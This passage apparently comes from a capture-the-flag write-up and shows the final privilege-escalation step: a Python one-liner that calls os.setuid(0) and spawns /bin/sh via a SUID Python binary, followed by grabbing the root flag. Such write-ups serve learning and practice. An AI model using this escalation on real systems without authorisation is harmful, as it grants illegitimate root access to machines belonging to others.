lrwxrwxrwx 1 root root 10 Nov 12 12:15 /usr/bin/python3 -> python3.12
```

- I can then run python with the SUID bit to spawn a shell this getting root shell:
```
python3
>>> import os; os.setuid(0); os.system("/bin/sh")
```
![[Pasted image 20260330085625.png]]

- I grab root flag:
![[Pasted image 20260330085654.png]]